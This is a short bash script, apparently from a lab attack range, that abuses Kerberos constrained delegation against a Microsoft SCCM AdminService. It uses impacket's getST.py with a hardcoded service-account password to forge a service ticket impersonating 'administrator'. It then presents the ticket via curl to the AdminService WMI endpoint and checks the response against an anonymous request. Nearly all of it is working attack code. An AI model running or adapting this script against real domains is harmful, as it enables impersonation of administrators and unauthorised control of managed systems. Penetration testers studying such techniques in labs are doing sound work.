#!/bin/bash
# getST + present the ST against the AdminService (run ON provisioning)
# After the SPN move, the ST for HTTP/mbr02.range.local is encrypted to mbr02$ -> LocalSystem provider decrypts.
cd /tmp
echo '--- getST (svc_sccm CD -> HTTP/mbr02.range.local as administrator) ---'
/home/vagrant/campaign-venv/bin/getST.py -spn HTTP/mbr02.range.local -impersonate administrator -dc-ip 192.168.77.12 'range/svc_sccm:s3rv1c3_SCCM!' -k 2>&1 | tail -12
echo '--- present ST ---'
if [ -f "/tmp/administrator@HTTP_mbr02.range.local@RANGE.LOCAL.ccache" ]; then
  KRB5CCNAME=/tmp/administrator@HTTP_mbr02.range.local@RANGE.LOCAL.ccache curl -k -s -o /dev/null -w 'ST:%{http_code}\n' --negotiate -u : --max-time 20 https://mbr02.range.local/AdminService/wmi/SMS_Site 2>&1
else
  echo 'NO CCACHE FOUND — getST did not produce a ticket'
fi
echo '--- anon baseline ---'
curl -k -s -o /dev/null -w 'ANON:%{http_code}\n' --max-time 15 https://mbr02.range.local/AdminService/v1.0/ 2>&1
